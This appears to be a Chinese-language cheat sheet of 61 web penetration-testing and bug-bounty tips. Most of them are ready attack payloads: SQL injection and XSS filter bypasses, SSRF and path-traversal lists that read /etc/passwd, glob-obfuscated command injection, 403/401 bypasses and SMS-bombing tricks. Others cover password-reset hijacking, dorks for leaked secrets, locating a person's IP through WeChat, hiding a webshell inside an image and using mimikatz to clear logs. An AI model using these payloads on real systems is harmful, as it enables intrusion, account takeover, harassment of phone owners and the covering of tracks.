1、如果提示缺少参数，如{msg：params error}，可尝使用字典模糊测试构造参数，进一步攻击
2、程序溢出，int最大值为2147483647，可尝试使用该值进行整数溢出，观察现象
3、403，404响应不灰心，尝试使用dirsearch等工具探测目录
4、验证码简单绕过：重复使用，万能验证码（0000,8888），空验证码，验证码可识别（可用PKAV HTTP Fuzzer工具识别等）
5、短信轰炸绕过：手机号前加+86有可能会绕过，手机号输入邮箱，邮箱处输入手机号
6、如果验证码有实效，可尝试一段时间内重复发送获取验证码，因为有实效，所以有可能会延长验证码的时长
7、SQL注入时，如果数据库是Mysql，可以尝试使用&&替换and，如：`' && '1'='1`,`	' %26%26 '1'='1`
8、SQL注入时，如果数据库是Mysql，waf过滤了\=，可尝试用like替代。如：`and 1 like 1`
9、JWT格式在[JSON Web Token - Decode](http://jwt.calebb.net/)可以解密，前提是要知道秘钥。可以尝试构造任意数据，看他会不会有报错信息中携带秘钥信息，可以通过[GitHub - firebase/php-jwt: PHP package for JWT](https://github.com/firebase/php-jwt)生成JWT。JWT格式`header.payload.signature`
10、如果开放了redis服务（1234端口），可以尝试使用`/actuator/redis/info`语句看是否能读取敏感信息，如：`http://www.xxx.com:1234/actuator/redis/info`
11、API接口处，可以自己构造参数，POST形式传参，可以尝试构造为JSON格式，记得添加`content-type: application/json`，一些可尝试参数，page，size，id
12、手机发送短信时间限制的话，可以在手机号前尝试使用特殊字符，或空格。他的逻辑应该是这样的，用户输入手机号——>后端判断该手机号是否在30秒或者60秒内请求过——>如果没有，判断发送过来的手机号是够是11位的纯数字，如果不是，去掉非数字字符——>和数据库中的手机号比对，是够存在于数据库中，如果存在那么向该手机发送验证码
13、图片验证码可设置为空，如：`code=undefined`
14、自动以验证码内容，观察Cookie中，参数中是否有发送给用户的内容，可以尝试更改，可以构造钓鱼链接
15、信息收集，在搜狗搜索中选择微信可以搜索相关企业相关公众号资产
16、在JS文件中搜索关键字`API`，`Swagger UI`等等，尝试寻找API接口地址
17、swagger接口常见路径：
```
/swagger/
/api/swagger/
/swagger/ui/
/api/swagger/ui/
/swagger-ui.html/
/api/swagger-ui.html/
/user/swagger-ui.html/
/swagger/ui/
/api/swagger/ui/
/libs/swaggerui/
/api/swaggerui/
/swagger-resources/configuration/ui/
/swagger-resources/configuration/security/
```
18、swagger组件特征固定`title：Swagger UI`
19、盲测目录是否存在，如果存在该目录可能会自动在URL末尾添加/补全
20、Mysql中可以利用的空白字符有：`%09,%0a,%0b,%0c,%0d,%20,%a0`
21、如果泄露阿里云的 AKSK，可以使用AKSKtools工具进一步利用[AKSK 命令执行到谷歌验证码劫持 - 先知社区](https://xz.aliyun.com/t/8429)
22、如果遇见后台页面一闪而过，接着让你登录，一般使用了权限认证方式，可以用一下方式进行绕过，或者遇见401,403,302，都可以尝试使用以下方法：
```
如果使用GET方法访问某些路径，返回403，可以先访问允许访问的路径，然后在请求头中，添加下面的头:
一、GET /xxx HTTP/1.1 à403 
Host: test.com 
绕过： GET /xxx HTTP/1.1 à200 
Host: test.com 
X-Original-URL: /xxx
X-Override-URL: /xxx
X-Rewrite-URL: /xxx

二、GET /xxx HTTP/1.1 à403 
Host: test.com 
绕过： GET /xxx HTTP/1.1 à200 
Host: test.com 
Referer: http://test.com/xxx 

三、302跳转：拦截并drop跳转的数据包，使其停留在当前页面。 

四、前端验证：只需要删掉对应的遮挡模块，或者是验证模块的前端代码。
```
23、一款生成gopher协议payload的工具：[GitHub - firebroo/sec_tools](https://github.com/firebroo/sec_tools)
24、Dict协议写入流程：
```
1.写入内容； dict://127.0.0.1:6379/set❌test 
2.设置保存路径； dict://127.0.0.1:6379/config:set:dir:/tmp/ 
3.设置保存文件名； dict://127.0.0.1:6379/config:set:dbfilename:1.png 
4.保存。 dict://127.0.0.1:6379/save
```
25、CentOS 7系统利用suid提权获取Root Shell [CentOS 7系统利用suid提权获取Root Shell - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/system/244627.html)
26、xss中标签利用的payload：`<a href=javascript:alert(1)>xx</a>`
27、XSS过滤了单引号，等号可以：
```
①、使用：String.fromCharCode(97,108,101,114,116,40,49,41); 
为alert(1)，该方法输出的结果为字符串，可以使用eval()进行执行，即弹框操作 eval(String.fromCharCode(97,108,101,114,116,40,49,41)); 
②、atob函数： 
eval(atob\`YWxlcnQoMSk=\`) 为 eval(atob\`alert(1)\`) 其中\`为反引号
```
28、XSS过滤了单引号，等号以及圆括号，eval：
```
①、过滤了eval函数可以用其他函数去绕过，如：Function，constructor Function`a${atob`YWxlcnQoMSk=`}``` ``.constructor.constructor`a${atob`YWxlcnQoMSk=`}```
```
29、可使用下面命令查看是否处在docker虚拟机中 `cat /proc/1/cgroup`
30、万能密码试试 `'=0#`
31、CORS漏洞验证，可以使用curl来验证：curl https://www.xxxx.com -H "Origin: https://test.com" -I 检查返回包的 `Access-Control-Allow-Origin` 字段是否为https://test.com
32、在盲测目标系统是否为Shiro时，可以在Cookie中手动构造`rememebrMe=xxx`，如果返回包中Set-Cookie中存在`rememberMe=deleteMe`，则证明该系统使用了Shiro，因此可以进一步攻击
33、使用正则获取网站中所包含的其他URL：
```
cat file | grep -Eo "(http|https)://\[a-zA-Z0-9./?=\_-\]\*"\* 
curl http://host.xx/file.js | grep -Eo "(http|https)://\[a-zA-Z0-9./?=\_-\]\*"\*
```
34、绕过SSRF防护的几个小方法：
```
A、绕过SSRF限制通过CIDR，如： 
http://127.127.127.127 
http://127.0.0.0 
B、不完整的地址，如： 
http://127.1 
http://0 
C、将地址结合在通过特殊字符结合在一起，如： 
http://1.1.1.1 &@2.2.2.2# @3.3.3.3/ 
urllib : 3.3.3.3 
D、绕过解析器，如： 
http://127.1.1.1:80\\@127.2.2.2:80/ 
E、绕过localhost通过\[::\]，如： 
http://\[::\]:80/ 
http://0000::1:80/
```
35、几个常用的Google语法：
```
inurl:example.com intitle:"index of" 
inurl:example.com intitle:"index of /" "\*key.pem" 
inurl:example.com ext:log 
inurl:example.com intitle:"index of" ext:sql|xls|xml|json|csv 
inurl:example.com "MYSQL\_ROOT\_PASSWORD:" ext:env OR ext:yml -git
```
36、通过favicon的hash来对比相关联的两个网站：
脚本地址：[Bug-Bounty-Toolz/favihash.py at master · m4ll0k/Bug-Bounty-Toolz · GitHub](https://github.com/m4ll0k/Bug-Bounty-Toolz/blob/master/favihash.py)
命令：`python3 favihash.py -f https://target/favicon.ico -t targets.txt -s`
37、在JavaScript文件中可以找一些隐藏的GET参数，比如：
首先，在js文件中找到一些变量，比如：`var test="xss"` 然后，可以尝试使用GET方法构造每一个参数，比如： `https://example.com/?test=" xsstest` 本方法可能会发现一些XSS
38、使用github dorks帮助我们寻找一些敏感信息，比如：
```
extension:pem private 
extension:ppk private 
extension:sql mysql dump password 
extension:json api.forecast.io 
extension:json mongolab.com 
extension:yaml mongolab.com 
extension:ica \[WFClient\] Password= 
extension:avastlic “support.avast.com” 
extension:js jsforce conn.login 
extension:json googleusercontent client\_secret 
“target.com” send\_keys 
“target.com” password 
“target.com” api\_key 
“target.com” apikey 
“target.com” jira\_password 
“target.com” root\_password 
“target.com” access\_token 
“target.com” config 
“target.com” client\_secret 
“target.com” user auth
```
通过上述语法，可以搜索到一些敏感的私钥，一些SSH登录私钥，mysql的数据库密码，API key等等,另外推荐一个脚本：[GitHub - techgaun/github-dorks: Find leaked secrets via github search](https://github.com/techgaun/github-dorks)
39、通过添加.json后缀，泄露一些敏感信息，比如：
一次正常请求：
```
GET /ResetPassword HTTP/1.1 
{"email":"victim@example.com"} 
响应： HTTP/1.1 200 OK
添加.json后缀的请求： 
GET /ResetPassword.json HTTP/1.1 
{"email":"victim@example.com"} 
响应： HTTP/1.1 200 OK 
{"success":"true","token":"596a96-cc7bf-9108c-d896f-33c44a-edc8a"}
```
40、如果响应为401，可以试试在请求头中添加`X-Custom-IP-Authorization: 127.0.0.1`
41、利用火绒剑，配合微信发语音的方式，可以获取该人的登录IP
42、目录穿越，敏感文件读取一些Payload：
```
\..\WINDOWS\\win.ini 
..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\
.?\.?\.?\etc\passwd 
../../boot.ini 
%0a/bin/cat%20/etc/passwd 
\\'/bin/cat%20/etc/passwd\\' 
..%c1%afetc%c1%afpasswd
```
43、在访问admin路径面板时可以通过添加%20，来绕过，具体如下：
```
target.com/admin –> HTTP 302 (重定向到登录页面) 
target.com/admin%20/ -> HTTP 200 OK 
target.com/%20admin%20/ -> HTTP 200 OK 
target.com/admin%20/page -> HTTP 200 OK
```
44、在重置密码的地方，可以尝试添加另外一个次要的账号，比如，手机号，邮箱号等等，比如：
```
a、构造两个参数： 
email=victim@xyz.tld&email=hacker@xyz.tld 
b、使用抄送方式: 
email=victim@xyz.tld%0a%0dcc:hacker@xyz.tld 
c、使用分隔符： 
email=victim@xyz.tld,hacker@xyz.tld 
email=victim@xyz.tld%20hacker@xyz.tld 
email=victim@xyz.tld|hacker@xyz.tld 
d、不使用域名：email=victim 
e、不使用顶级域名：email=victim@xyz 
f、JSON情况： {"email":\["victim@xyz.tld","hacker@xyz.tld"\]}
```
45、如果有利用邮箱重置密码功能的情况，而且还是JSON传输的情况下，使用SQLmap跑注入，可以将\*（星号）放在@之前，比如：
原文链接 [Bug Bounty Tips #7 - InfosecMatter](https://www.infosecmatter.com/bug-bounty-tips-7-sep-27/#2_bypass_email_filter_leading_to_sql_injection_json)
45、可以获取目标站点的favicon.ico图标的哈希值，然后配合shodan进行目标站点资产收集，因为每个目标站点的favicon.ico图标的哈希值可能是固定值，因此可以通过该方法从shodan，fofa等等去寻找更多资产。
简单的用法：
```
#python 3 
import mmh3 
import requests 
import codecs 
response = requests.get("https://www.baidu.com/favicon.ico") 
favicon = codecs.encode(response.content,"base64") 
hash = mmh3.hash(favicon) 
print(hash)
```
或使用下面这个github项目：[GitHub - devanshbatham/FavFreak: Making Favicon.ico based Recon Great again !](https://github.com/devanshbatham/FavFreak)
shodan搜索语句：http.favicon.hash:哈希值 
fofa搜索语句：icon\_hash="-247388890"（但仅限于高级用户使用）
原文链接：[Bug Bounty Tips #8 - InfosecMatter](https://www.infosecmatter.com/bug-bounty-tips-8-oct-14/#8_database_of_500_favicon_hashes_favfreak)
46、绕过403和401的小技巧：
a、添加以下请求头，比如：X-Originating-IP, X-Remote-IP, X-Client-IP, X-Forwarded-For等等；有可能会有一些白名单IP地址可以访问这些敏感数据。
可以使用下面这些Payload试试
```
/accessible/..;/admin 
/.;/admin 
/admin;/ 
/admin/~ 
/./admin/./ 
/admin?param 
/%2e/admin 
/admin#
```
原文链接：[Bug Bounty Tips #8 - InfosecMatter](https://www.infosecmatter.com/bug-bounty-tips-8-oct-14/#11_tips_on_bypassing_403_and_401_errors)
47、如果访问/.git目录返回403，别忘了进一步访问下面的目录，比如：`/.git/config`
48、使用通配符绕过WAF，如果WAF拦截了RCE，LFI的payload，我们可以尝试使用通配符来绕过，比如：
```
/usr/bin/cat /etc/passwd == /???/???/c?t$IFS/?t?/p?s?wd 
? = 任意的单个字符 
\* = 任意字符串，也包含置空的字符串 
通配符在常见的系统中都适用，另外我们可以使用$IFS特殊变量取代空白
$IFS = 内部字段分隔符 = [space], [tab] 或者 [newline] 
cat /etc$u/p*s*wd$u 
小例子，执行/bin/cat /etc/passwd的写法： 
/*/?at$IFS/???/???swd 
/****/?at$IFS/???/*swd 
/****/?at$IFS/???/*******swd
```
原文地址：[Bug Bounty Tips #9 - InfosecMatter](https://www.infosecmatter.com/bug-bounty-tips-9-nov-16/#8_waf_bypass_using_globbing)
49、绕过403的一个BurpSuit插件，地址：[GitHub - sting8k/BurpSuite_403Bypasser: Burpsuite Extension to bypass 403 restricted directory](https://github.com/sting8k/BurpSuite_403Bypasser)
50、SSRF bypass列表，基于localhost（127.0.0.1），如下：
```
http://127.1/ 
http://0000::1:80/ 
http://[::]:80/ 
http://2130706433/ 
http://whitelisted@127.0.0.1 
http://0x7f000001/ 
http://017700000001 
http://0177.00.00.01 
http://⑯⑨。②⑤④。⑯⑨｡②⑤④/ 
http://⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ｡⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ:80/ 
http://⓪ⓧⓐ⑨ⓕⓔⓐ⑨ⓕⓔ:80/ 
http://②⑧⑤②⓪③⑨①⑥⑥:80/ 
http://④②⑤｡⑤①⓪｡④②⑤｡⑤①⓪:80/ 
http://⓪②⑤①。⓪③⑦⑥。⓪②⑤①。⓪③⑦⑥:80/ 
http://0xd8.0x3a.0xd6.0xe3 
http://0xd83ad6e3 
http://0xd8.0x3ad6e3 
http://0xd8.0x3a.0xd6e3 
http://0330.072.0326.0343 
http://000330.0000072.0000326.00000343 
http://033016553343 
http://3627734755 
http://%32%31%36%2e%35%38%2e%32%31%34%2e%32%32%37 http://216.0x3a.00000000326.0xe3
```
原文链接：[Bug Bounty Tips #10 - InfosecMatter](https://www.infosecmatter.com/bug-bounty-tips-10-dec-24/#13_ssrf_bypass_list_for_localhost_127001)
51、容易发生短信轰炸的几个业务场景以及绕过方法：
①：登录处 ②：注册处 ③：找回密码处 ④：绑定处 ⑤：活动领取处 ⑥：独特功能处 ⑦：反馈处
一般绕过限制方法：
手机号码前后加空格,若干+，86，086，0086，+86，0，00，/r,/n, 以及特殊符号等
修改cookie，变量，返回
138888888889 12位经过短信网关取前11位，导致短信轰炸
52、注入的时候可以试试`--%0a union` `--%0a select` 尝试绕过
53、如果在旁站中发现短信验证码在response中出现，可以试试主站或者其他站点中验证码是否通用
54、获取短信验证码时，用逗号、拼接符等隔开两个手机号，有可能两个手机号能获取到同一个验证码
55、测试注入 `and ord(0x1) ->true`，`and ord(0x0) ->false`
56、使用python快速开启http服务器：
基于python2.x，命令如下：
`python -m SimpleHTTPServer 8000`
在当前目录起个 8000 端口的 HTTP 服务 
基于python3.x，命令如下：
`python -m http.server 8000`
57、整理字典时，推荐用linux下的工具快速合并和去重
```
cat file1.txt file2.txt fileN.txt > out.txt 
sort out.txt | uniq > out2.txt
```
58、注入时使用url编码对&&和||编码可以绕过一些拦截
```
1' and 1=1--+ 
1' %26%26 True--+ 
同理其他编码也可以试一个遍。
```
59、信息收集的时候可以使用fofa查看证书看是否是真实IP 语法 `cert="baidu.com"`
60、将普通图片1.jpg 和 木马文件shell.php ,合并成木马图片2.jpg
 `copy /b 1.jpg+shell.php 2.jpg`
 61、mimikatz小功能
 多用户登录3389：`ts::multirdp` 
 清除日志：`event::drop` 
 粘贴板信息：`misc::clip`